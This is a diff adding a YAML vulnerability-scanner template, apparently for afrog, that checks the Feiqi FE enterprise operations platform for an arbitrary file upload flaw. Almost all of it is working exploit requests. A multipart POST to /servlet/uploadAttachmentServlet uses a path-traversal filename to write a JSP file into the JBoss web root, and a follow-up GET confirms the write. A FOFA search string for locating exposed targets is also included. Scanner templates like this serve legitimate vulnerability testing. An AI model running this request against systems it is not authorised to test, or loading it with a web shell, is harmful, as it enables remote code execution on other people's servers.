@@ -1,0 +1,45 @@
+id: feiqi-uploadattachmentservlet-fileupload
+
+info:
+  name: 飞企互联-FE企业运营管理平台uploadAttachmentServlet接口存在任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    飞企互联-FE企业运营管理平台
+    fofa: body="/login/indexPicXml_valid.jsp?p="
+  reference:
+    - https://mp.weixin.qq.com/s/E60gLWTZlEBgBRts0oNI-A
+  tags: feiqi,fileupload
+  created: 2024/03/29
+
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /servlet/uploadAttachmentServlet
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"uploadFile\"; filename=\"../../../../../jboss/web/fe.war/{{randstr}}.jsp\"\r\n\
+        Content-Type: text/plain\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"json\"\r\n\
+        \r\n\
+        {\"iq\":{\"query\":{\"UpdateType\":\"mail\"}}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'"guid":')  && response.body.bcontains(b'"errorMessage":')
+  r1:
+    request:
+      method: GET
+      path: /{{randstr}}.jsp;
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
